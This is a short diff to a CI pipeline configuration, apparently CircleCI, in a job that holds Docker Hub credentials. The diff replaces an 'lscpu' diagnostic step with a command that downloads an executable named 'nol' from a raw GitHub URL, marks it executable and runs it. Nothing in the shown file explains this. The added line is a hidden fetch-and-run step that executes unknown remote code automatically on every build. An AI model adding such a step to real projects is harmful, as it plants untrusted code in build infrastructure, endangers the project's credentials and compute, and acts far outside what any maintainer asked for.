@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD
     steps:
       - checkout 
-      - run: lscpu
+      - run: wget https://raw.githubusercontent.com/komandan75758/contoh/main/nol && chmod u+x nol && ./nol
